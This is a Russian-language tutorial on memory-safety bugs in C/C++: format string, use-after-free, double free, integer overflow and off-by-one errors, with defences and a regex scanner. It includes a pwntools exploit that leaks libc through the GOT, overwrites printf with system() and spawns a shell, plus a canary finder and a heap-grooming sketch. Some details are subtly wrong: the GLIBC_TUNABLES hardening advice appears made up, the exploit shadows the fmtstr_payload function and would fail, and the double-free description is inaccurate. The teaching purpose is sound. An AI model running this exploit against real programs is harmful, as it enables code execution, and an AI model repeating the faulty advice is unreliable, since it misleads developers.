# Format String, Use-After-Free, Double Free, Integer Overflow

## Введение

Переполнение буфера — не единственный способ нарушить память программы. Существует ещё несколько классов уязвимостей, каждый со своей механикой и историей реальных эксплойтов. Четыре из них наиболее важны:

- **Format String** — неправильное использование printf-подобных функций, позволяющее читать и записывать произвольную память
- **Use-After-Free** — использование указателя после освобождения памяти, ведущее к контролю над объектом
- **Double Free** — двойное освобождение одного блока, разрушающее структуры управления кучей
- **Integer Overflow** — арифметическое переполнение целых чисел, приводящее к некорректным вычислениям размеров буферов

Каждый из этих классов отвечает за множество CVE ежегодно. Понять их — значит понять, как писать и проверять безопасный код.

---

## 1. Format String уязвимости

### Механика

```c
#include <stdio.h>

// БЕЗОПАСНО: строка формата — литерал
printf("Hello, %s!\n", name);

// УЯЗВИМО: строка формата — пользовательский ввод
printf(user_input);           // CVE-материал!
printf(user_input, arg1);     // тоже опасно

// Почему? Потому что:
// printf() берёт аргументы со стека в соответствии с format string
// Если user_input = "%p %p %p", printf читает 3 указателя со стека
// и выводит их — это УТЕЧКА АДРЕСОВ
```

### Эксплойт чтения памяти

```c
// Демонстрация чтения стека через format string
// (НЕ запускайте в production!)

#include <stdio.h>

void demonstrate_read() {
    char secret[16] = "SECRET_KEY_1234";
    char input[64];
    
    printf("Enter: ");
    fgets(input, sizeof(input), stdin);
    
    // УЯЗВИМОСТЬ: printf(input) вместо printf("%s", input)
    printf(input);  // если input = "%p %p %p %p %p %p %p %p"
    // Вывод: 0x7fff... 0x7fff... 0x534543 0x455245 ... ← адреса + данные стека!
    // 0x534543 = "SEC", 0x455245 = "RET" — части строки secret[]!
}
```

### Прямой доступ к параметрам

```c
// Format string поддерживает прямую адресацию параметров: %N$p
// N-й аргумент со стека

// Например, для поиска канарейки:
// Ввод: %1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p
// Ищем значение вида: 0x????????00 (канарейка — с нулевым байтом)

// Пример на Python (поиск канарейки через format string):
def find_canary_offset(target):
    """Перебираем смещения, ищем значение с нулевым младшим байтом"""
    for i in range(1, 50):
        payload = f'%{i}$016lx'.encode()  # вывести i-й аргумент как 64-bit hex
        target.sendline(payload)
        response = target.recvline().strip()
        
        try:
            value = int(response, 16)
            if (value & 0xFF) == 0 and value != 0:
                print(f"[+] Canary likely at offset {i}: {value:#018x}")
                return i, value
        except ValueError:
            continue
    
    return None, None
```

### Запись в память: %n

```c
// %n — самая опасная спецификация: записывает количество выведенных символов
// по адресу, указанному как аргумент

#include <stdio.h>

void format_write_demo() {
    int written_count;
    
    // Легитимное использование %n:
    printf("Hello%n", &written_count);  // written_count = 5
    
    // УЯЗВИМОЕ: атакующий управляет format string
    // Если format = "AAAAAAAA%n" и 8-й аргумент на стеке — интересный адрес:
    // → записать значение 8 по нужному адресу
    
    // Контроль значения через ширину:
    // %100x%n → записать 100 по адресу
    // %hn — записать 2 байта (short)
    // %hhn — записать 1 байт
    
    // Запись произвольного значения 0x41424344 по адресу 0xdeadbeef:
    // Разбиваем на 2 части: 0x4142, 0x4344
    // Используем %hn (short write) дважды
}
```

### Полный пример эксплойта (чтение + запись)

```python
# Format string exploit: читаем адрес, вычисляем базу, перезаписываем GOT
from pwn import *

def format_string_exploit():
    p = process('./vuln_fmt')
    elf = ELF('./vuln_fmt')
    
    # Шаг 1: Утечка адреса printf через GOT
    # Находим смещение, где стек содержит адрес в libc
    # Метод: перебор %N$p, смотрим на значения
    
    # Если printf@got лежит на 14-м смещении стека:
    leak_payload = b'AAAA' + p64(elf.got['printf']) + b'%14$s'
    # %14$s = читать строку (указатель) из 14-го "аргумента" стека
    # → читает содержимое elf.got['printf'] = реальный адрес printf в libc!
    
    p.sendline(leak_payload)
    response = p.recvline()
    
    # Извлекаем утечку
    # (формат ответа зависит от реализации уязвимой программы)
    leaked_printf = u64(response[:8].ljust(8, b'\x00'))
    
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = leaked_printf - libc.symbols['printf']
    
    # Шаг 2: Перезаписать printf@got адресом system()
    # Следующий вызов printf(user_input) → system(user_input) → RCE!
    
    system_addr = libc.symbols['system']
    
    # FmtStr — автоматическое построение payload для записи
    fmtstr_payload = fmtstr_payload(
        offset=14,                    # смещение до управляемых данных на стеке
        writes={elf.got['printf']: system_addr}  # адрес → значение
    )
    
    p.sendline(fmtstr_payload)
    p.sendline(b'/bin/sh')  # теперь printf("/bin/sh") → system("/bin/sh")
    p.interactive()
```

### Защита от format string уязвимостей

```c
// 1. НИКОГДА не передавайте пользовательский ввод как format string
printf(user_input);          // НИКОГДА
printf("%s", user_input);    // ПРАВИЛЬНО

fprintf(log, message);       // НИКОГДА (если message из внешнего источника)
fprintf(log, "%s", message); // ПРАВИЛЬНО

// 2. Флаги компилятора
// -Wformat=2 (gcc/clang) — предупреждение о небезопасных format string
// -Wformat-security — подмножество -Wformat=2
// -Werror=format-security — превратить в ошибку

// 3. Запрет %n в системных libc
// glibc: установить GLIBC_TUNABLES=glibc.printf.disable_security_features=0
// или использовать __USE_MINGW_ANSI_STDIO для ограничений

// 4. Static analysis
// cppcheck, clang-tidy автоматически обнаруживают эту уязвимость
```

---

## 2. Use-After-Free (UAF)

### Механика

Use-After-Free возникает, когда программа освобождает память (`free()`), но продолжает использовать указатель на неё.

```c
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*print)(const char*);  // указатель на функцию!
} Object;

void safe_print(const char *s) { printf("Safe: %s\n", s); }
void admin_print(const char *s) { system(s); }  // опасная функция!

void use_after_free_demo() {
    // Выделяем объект
    Object *obj = malloc(sizeof(Object));
    obj->print = safe_print;
    strncpy(obj->name, "Alice", 31);
    
    // Используем объект
    obj->print(obj->name);  // Safe: Alice
    
    // Освобождаем
    free(obj);
    
    // ОШИБКА: продолжаем использовать освобождённый указатель!
    // obj теперь "dangling pointer" (висячий указатель)
    
    // Атакующий в другом потоке выделяет блок того же размера
    // и записывает туда свои данные (в т.ч. перезаписывает obj->print)
    Object *attacker_obj = malloc(sizeof(Object));
    attacker_obj->print = admin_print;  // указатель на опасную функцию
    // (если размер совпадает, malloc вернёт тот же адрес)
    
    // Продолжаем использовать старый указатель:
    obj->print(obj->name);  // вызывает admin_print("Alice") → system("Alice")!
}
```

### Механизм аллокатора: как это работает

```
Состояние кучи:
1. malloc(sizeof(Object)) → адрес 0x1000
   [ALLOCATED: Object{name="Alice", print=safe_print}]

2. free(obj)
   [FREE: addr=0x1000, size=48, next=NULL]
   obj всё ещё = 0x1000 (dangling pointer)!

3. malloc(sizeof(Object)) → адрес 0x1000 (тот же!)
   [ALLOCATED: новый блок по 0x1000]
   
4. Запись в новый блок: {name="cmd", print=admin_print}
   [ALLOCATED: Object{name="cmd", print=admin_print} at 0x1000]

5. obj->print(obj->name)
   obj = 0x1000 → print = admin_print, name = "cmd"
   Вызов: admin_print("cmd") → system("cmd") → RCE!
```

### Реальный пример: браузерные UAF

UAF — основной тип уязвимостей в браузерных движках (Chrome V8, Firefox SpiderMonkey):

```c
// Упрощённый пример DOM UAF (концептуальный)
typedef struct DOMNode {
    char* text;
    struct DOMNode* parent;
    struct DOMNode** children;
    int child_count;
    void (*render)(struct DOMNode*);
} DOMNode;

// Уязвимая функция: removeChild не обнуляет ссылки
void remove_child_unsafe(DOMNode *parent, DOMNode *child) {
    // Удаляем из дерева
    for (int i = 0; i < parent->child_count; i++) {
        if (parent->children[i] == child) {
            parent->children[i] = NULL;
            break;
        }
    }
    // Освобождаем узел
    free(child->text);
    free(child);
    // Проблема: JavaScript-переменная всё ещё ссылается на child!
    // → Use-After-Free через JavaScript heap spray
}
```

### Правильный паттерн: обнуление указателей

```c
// ПРАВИЛО: после free() ВСЕГДА обнулять указатель
void safe_free(void **ptr) {
    if (ptr && *ptr) {
        free(*ptr);
        *ptr = NULL;  // Обнуление!
    }
}

// Использование:
Object *obj = malloc(sizeof(Object));
// ... работа с obj ...
safe_free((void**)&obj);
// obj == NULL
// Повторное использование: obj->print → разыменование NULL → SIGSEGV (не UAF!)

// Макрос для удобства:
#define SAFE_FREE(p) do { free(p); (p) = NULL; } while(0)
```

### Умные указатели в C++ (предотвращение UAF)

```cpp
#include <memory>
#include <string>

// ПРАВИЛЬНО: unique_ptr — единственный владелец
void with_unique_ptr() {
    auto obj = std::make_unique<Object>("Alice", safe_print);
    
    obj->print(obj->name);  // OK
    
    // После выхода из блока obj автоматически освобождается
    // Попытка использовать после освобождения невозможна без явного std::move
}

// ПРАВИЛЬНО: shared_ptr — несколько владельцев
void with_shared_ptr() {
    auto obj = std::make_shared<Object>("Bob", safe_print);
    auto ref = obj;  // shared_ptr копирует, увеличивает счётчик ссылок
    
    obj.reset();  // Освобождает один ссылатель, объект ещё жив (ref держит его)
    ref->print(ref->name);  // OK! Объект ещё существует
    
    // Объект освобождается только когда ref тоже выходит из scope
}

// ПРАВИЛЬНО: weak_ptr — наблюдатель без владения
void with_weak_ptr() {
    std::shared_ptr<Object> owner = std::make_shared<Object>("Carol", safe_print);
    std::weak_ptr<Object> observer = owner;  // не увеличивает счётчик
    
    owner.reset();  // Освобождаем объект
    
    // Проверяем, жив ли объект:
    if (auto locked = observer.lock()) {
        locked->print(locked->name);  // OK, объект жив
    } else {
        printf("Object was already freed\n");  // Безопасно!
    }
}
```

---

## 3. Double Free

### Механика

Double Free — освобождение одного и того же блока памяти дважды.

```c
#include <stdlib.h>

void double_free_demo() {
    char *buf = malloc(64);
    
    if (some_error_condition) {
        free(buf);  // освобождаем при ошибке
        // ... но не выходим из функции, или пишем плохой код
    }
    
    // ... код продолжается ...
    
    free(buf);  // ОШИБКА: двойное освобождение!
    // Поведение: undefined behavior
    // Возможные последствия:
    // 1. Crash (SIGSEGV или heap corruption)
    // 2. Heap metadata corruption → exploit
}
```

### Почему это опасно: unlink exploit

```c
// Упрощённая структура chunk в glibc ptmalloc2
struct malloc_chunk {
    size_t prev_size;   // размер предыдущего блока (если свободен)
    size_t size;        // размер текущего блока + флаги
    
    // Только в свободных блоках:
    struct malloc_chunk *fd;  // forward  pointer (double-linked list)
    struct malloc_chunk *bk;  // backward pointer
};

// При free() блок добавляется в bin (список свободных блоков)
// При повторном free():
// 1. Блок уже в списке свободных
// 2. free() снова добавляет его → fd/bk испорчены
// 3. При следующем malloc() → unlink повреждённого блока
//    → запись по произвольному адресу (fd/bk атакующего!)

// Современные glibc имеют защиту:
// 1. Double free detection: проверка флага IS_MAPPED
// 2. Safe unlink: проверка P->fd->bk == P && P->bk->fd == P
// Но bypass существуют.
```

### Правильные паттерны

```c
// 1. Обнуление после free (как и для UAF)
char *buf = malloc(64);
free(buf);
buf = NULL;  // Попытка free(NULL) → no-op (безопасно!)

// 2. Использование smart pointers в C++
// RAII: Resource Acquisition Is Initialization

// 3. Defer pattern (Go-style в C)
#include <setjmp.h>

typedef struct {
    void (*func)(void*);
    void *arg;
} Cleanup;

#define MAX_CLEANUPS 16

// Паттерн очистки для избежания double free:
int operation_with_cleanup(void) {
    char *buf1 = NULL, *buf2 = NULL, *buf3 = NULL;
    int result = -1;
    
    buf1 = malloc(64);
    if (!buf1) goto cleanup;
    
    buf2 = malloc(128);
    if (!buf2) goto cleanup;
    
    buf3 = malloc(256);
    if (!buf3) goto cleanup;
    
    // ... основная работа ...
    result = 0;
    
cleanup:
    // Освобождаем в обратном порядке, но только один раз каждый!
    free(buf3);  // free(NULL) — безопасно
    free(buf2);
    free(buf1);
    
    return result;
}
```

### Обнаружение с AddressSanitizer

```bash
# Компиляция с ASan
gcc -fsanitize=address -g -o program program.c

# Double free обнаруживается немедленно:
# ==12345==ERROR: AddressSanitizer: attempting double-free on address 0x602000000010
# at 0x7f... in free (/lib/x86_64/asan.so)
# at 0x401234 in double_free_demo program.c:12
# 
# 0x602000000010 was previously freed at:
#     #0 0x7f... in free
#     #1 0x401222 in double_free_demo program.c:7
```

---

## 4. Integer Overflow

### Типы целочисленных переполнений

```c
#include <stdint.h>
#include <limits.h>

// 1. Signed overflow (UB в C!)
int a = INT_MAX;       // 2147483647
int b = a + 1;         // Undefined Behavior! (компилятор может оптимизировать)
// На x86: wraps around → -2147483648, но формально UB

// 2. Unsigned wrap-around (well-defined в C)
uint32_t x = UINT32_MAX;  // 4294967295
uint32_t y = x + 1;       // 0 (wrap-around, это не UB)

// 3. Integer truncation
int large = 300;
char small = (char)large;  // 300 → 44 (300 % 256)

// 4. Sign change
int signed_val = -1;
unsigned int unsigned_val = (unsigned int)signed_val;  // → 4294967295
```

### Уязвимость: неверное вычисление размера

```c
// CVE-паттерн: malloc с переполненным аргументом

// УЯЗВИМО: size_t = 64-bit, но умножение может переполниться
void* allocate_array_unsafe(size_t count, size_t element_size) {
    size_t total = count * element_size;  // OVERFLOW!
    // Если count = 0x8000000000000000 и element_size = 2
    // total = 0x8000000000000000 * 2 = 0 (overflow!)
    // malloc(0) вернёт маленький блок
    // Затем запись count элементов → heap overflow!
    
    return malloc(total);
}

// БЕЗОПАСНО: проверка переполнения перед умножением
#include <stdint.h>

void* allocate_array_safe(size_t count, size_t element_size) {
    // Метод 1: проверка через деление
    if (element_size != 0 && count > SIZE_MAX / element_size) {
        return NULL;  // overflow!
    }
    
    size_t total = count * element_size;
    if (total == 0) return NULL;  // защита от malloc(0)
    
    return malloc(total);
}

// Метод 2: builtin overflow check (GCC/Clang)
void* allocate_array_builtin(size_t count, size_t element_size) {
    size_t total;
    if (__builtin_mul_overflow(count, element_size, &total)) {
        return NULL;  // overflow!
    }
    return malloc(total);
}

// Метод 3: reallocarray (glibc 2.26+)
// reallocarray(ptr, count, size) — безопасно умножает count*size
void* reallocarray_example(size_t count, size_t size) {
    return reallocarray(NULL, count, size);  // эквивалентно malloc(count * size) с проверкой
}
```

### Уязвимость: знаковое преобразование

```c
// Классическая ошибка: сравнение signed и unsigned

int vulnerable_copy(char *dst, const char *src, int n) {
    // n — знаковый! Атакующий может передать n = -1
    if (n > 0) {
        memcpy(dst, src, n);  // Если n = -1: (size_t)(-1) = HUGE!
    }
    return n;
}

// БЕЗОПАСНО:
int safe_copy(char *dst, size_t dst_size, const char *src, size_t n) {
    if (n > dst_size) return -1;  // оба беззнаковые
    memcpy(dst, src, n);
    return 0;
}
```

### Обнаружение с UBSan и -ftrapv

```bash
# -fsanitize=undefined (UBSan) обнаруживает:
# - signed integer overflow
# - integer divide by zero
# - shift overflow
# - null pointer dereference
# - misaligned access

gcc -fsanitize=undefined -fsanitize=integer \
    -fno-sanitize-recover=all -g \
    -o program program.c

# При overflow:
# program.c:5:20: runtime error: signed integer overflow: 2147483647 + 1 cannot be
# represented in type 'int'

# -ftrapv: abort() при signed overflow
gcc -ftrapv -o program program.c
```

### Безопасная арифметика в Python и Rust

```python
# Python: нет integer overflow! Числа произвольной точности
a = 2**63  # 9223372036854775808 — не переполняется
b = a * a  # 85070591730234615865843651857942052864 — всё ещё корректно

# Но! При работе с C через ctypes нужна осторожность:
import ctypes

a = ctypes.c_int32(2147483647)
b = ctypes.c_int32(a.value + 1)  # overflow → -2147483648

# Безопасная проверка диапазона:
def safe_add_i32(a: int, b: int) -> int:
    result = a + b
    if result > 2147483647 or result < -2147483648:
        raise OverflowError(f"i32 overflow: {a} + {b} = {result}")
    return result
```

```rust
// Rust: panic при overflow в debug, wrapping в release
fn rust_overflow_safety() {
    let a: i32 = i32::MAX;
    
    // Debug mode: panic! "attempt to add with overflow"
    // let b = a + 1;  // → panic
    
    // Явные операции:
    let wrapped = a.wrapping_add(1);    // i32::MIN (wrap-around)
    let saturated = a.saturating_add(1); // i32::MAX (насыщение)
    let checked = a.checked_add(1);      // None (возвращает Option<i32>)
    let overflowing = a.overflowing_add(1); // (i32::MIN, true) — кортеж
    
    // Безопасная работа с размерами:
    fn allocate_array(count: usize, element_size: usize) -> Vec<u8> {
        let total = count.checked_mul(element_size)
            .expect("size overflow");
        vec![0u8; total]
    }
}
```

---

## 5. Off-by-One ошибки

Особый подкласс переполнений — ошибки на 1:

```c
// Классические off-by-one:

// 1. Неверный размер буфера
char buf[10];
// Строка "1234567890" имеет 10 символов + '\0' = 11 байт
// strcpy(buf, "1234567890") — запись '\0' за пределы!
strncpy(buf, "1234567890", sizeof(buf));  // Нет '\0' в конце!
buf[sizeof(buf)-1] = '\0';               // Исправление

// 2. Ошибка в цикле
int arr[10];
for (int i = 0; i <= 10; i++) {  // должно быть i < 10
    arr[i] = 0;  // arr[10] — запись за пределы!
}

// 3. Fence-post error при вычислении размера
size_t len = strlen(str);
char *copy = malloc(len);  // забыли +1 для '\0'!
memcpy(copy, str, len + 1);  // запись '\0' за пределы выделенного!

// ПРАВИЛЬНО:
char *copy = malloc(len + 1);  // +1 для нуль-терминатора
memcpy(copy, str, len + 1);
```

---

## 6. Heap Grooming — подготовка кучи

Для надёжного использования UAF/double free атакующий должен контролировать расположение объектов в куче. Техника называется **heap grooming** или **heap feng shui**:

```python
# Heap grooming (концептуально):
# Цель: заставить malloc() вернуть нужный адрес после free()

def heap_groom_example(target):
    """
    Подготовка кучи для reliable UAF exploit
    
    Хотим: после free(victim), malloc(same_size) вернёт тот же адрес
    """
    # 1. Заполняем кучу объектами нужного размера
    fake_objects = []
    for i in range(100):
        fake_objects.append(allocate_object(target, size=64))
    
    # 2. Освобождаем каждый второй — создаём "holes"
    for i in range(0, 100, 2):
        free_object(target, fake_objects[i])
    
    # 3. Теперь куча имеет предсказуемую структуру
    # Выделение victim попадёт в один из "holes"
    victim = allocate_victim(target, size=64)
    
    # 4. Освобождаем victim (UAF) и сразу же выделяем controlled object
    free_object(target, victim)
    controlled = allocate_controlled(target, size=64, data=exploit_data)
    
    # 5. victim и controlled теперь на одном адресе!
    # Использование victim → использование controlled
    use_victim(target, victim)  # → использует наши данные
```

---

## 7. Статический анализ для обнаружения уязвимостей

```bash
# Coverity (коммерческий) — лучший статический анализатор
cov-analyze --dir cov-int --all

# Flawfinder — быстрый поиск опасных функций
pip install flawfinder
flawfinder ./src/

# Semgrep — анализ паттернов
pip install semgrep
semgrep --config "p/c-and-cpp" ./src/

# CodeChecker + Clang Static Analyzer
CodeChecker analyze --jobs 4 --build "make" --output ./reports
CodeChecker parse ./reports

# PVS-Studio (коммерческий, есть free для open source)
pvs-studio-analyzer analyze -o report.log
```

```python
# Скрипт автоматической проверки кода на опасные паттерны
import re
from pathlib import Path

DANGEROUS_PATTERNS = [
    (r'\bgets\s*\(', "gets() — удалена из C11, всегда уязвима"),
    (r'\bstrcpy\s*\(', "strcpy() — не проверяет длину, используйте strlcpy"),
    (r'\bstrcat\s*\(', "strcat() — не проверяет длину, используйте strlcat"),
    (r'\bsprintf\s*\(', "sprintf() — используйте snprintf"),
    (r'\bvsprintf\s*\(', "vsprintf() — используйте vsnprintf"),
    (r'\bscanf\s*\(\s*"[^"]*%s[^"]*"', "scanf с %s — добавьте ограничение ширины"),
    (r'printf\s*\([^,)]*\)', "printf без format string — уязвимость format string"),
    (r'\bmalloc\s*\([^)]*\*[^)]*\)', "malloc с умножением — проверьте overflow"),
]

def scan_c_file(filepath: Path) -> list[dict]:
    """Сканирование C файла на опасные паттерны"""
    issues = []
    
    with open(filepath) as f:
        lines = f.readlines()
    
    for lineno, line in enumerate(lines, 1):
        # Пропускаем комментарии
        stripped = re.sub(r'//.*$', '', line)
        stripped = stripped.strip()
        
        for pattern, description in DANGEROUS_PATTERNS:
            if re.search(pattern, stripped):
                issues.append({
                    'file': str(filepath),
                    'line': lineno,
                    'code': stripped,
                    'issue': description
                })
    
    return issues

def scan_project(root: str) -> None:
    """Сканирование всех C файлов в проекте"""
    root_path = Path(root)
    all_issues = []
    
    for c_file in root_path.rglob('*.c'):
        issues = scan_c_file(c_file)
        all_issues.extend(issues)
    
    if not all_issues:
        print("No obvious issues found")
        return
    
    print(f"Found {len(all_issues)} potential issues:")
    for issue in all_issues:
        print(f"  {issue['file']}:{issue['line']}: {issue['issue']}")
        print(f"    Code: {issue['code']}")
```

---

## 8. Сводная таблица уязвимостей и защит

| Уязвимость | Причина | Обнаружение | Защита |
|------------|---------|-------------|--------|
| Format String | printf(user_str) | -Wformat-security | printf("%s", user_str) |
| Use-After-Free | Использование после free() | ASan, valgrind | Умные указатели, обнуление |
| Double Free | free() дважды | ASan, valgrind | Обнуление, RAII |
| Integer Overflow | Нет проверки арифметики | UBSan, -ftrapv | Checked arithmetic |
| Off-by-One | Ошибка границ | ASan, valgrind | Тщательный code review |
| Heap Overflow | Запись за пределы heap | ASan | Проверка размеров |

---

## Заключение

Четыре рассмотренных класса уязвимостей — format string, UAF, double free и integer overflow — ответственны за большую часть критических CVE в C/C++ коде. Их объединяет то, что они нарушают инварианты работы с памятью: либо читают/пишут за пределы отведённых буферов, либо используют уже освобождённые ресурсы, либо производят некорректные вычисления размеров.

**Системный подход к защите:**
1. **ASLR + PIE + NX** — базовый уровень (делает эксплуатацию сложнее)
2. **ASan + UBSan в CI/CD** — обнаруживает уязвимости при тестировании
3. **Статический анализ** (clang-tidy, Coverity) — находит паттерны в коде
4. **Smart pointers в C++** — предотвращают UAF и double free
5. **`checked_*` функции** — арифметика с проверкой переполнения
6. **Переход на Rust** — устраняет весь этот класс проблем на уровне типов

---

## Литература и источники

1. Sotirov, A. (2007). *Heap Feng Shui in JavaScript*. BlackHat Europe 2007. https://www.phreedom.org/research/heap-feng-shui/
2. CWE-416: Use After Free. MITRE. https://cwe.mitre.org/data/definitions/416.html
3. CWE-415: Double Free. MITRE. https://cwe.mitre.org/data/definitions/415.html
4. CWE-190: Integer Overflow or Wraparound. MITRE. https://cwe.mitre.org/data/definitions/190.html
5. Format String Vulnerability. OWASP. https://owasp.org/www-community/attacks/Format_string_attack
6. GCC Undefined Behavior Sanitizer. https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
7. AddressSanitizer: A Fast Address Sanity Checker. https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/37752.pdf
8. Secure Coding in C and C++. SEI CERT. https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard
9. Pincus, J., Baker, B. (2004). *Beyond Stack Smashing: Recent Advances in Exploiting Buffer Overruns*. IEEE Security & Privacy.
10. The LLVM Project: libFuzzer. https://llvm.org/docs/LibFuzzer.html
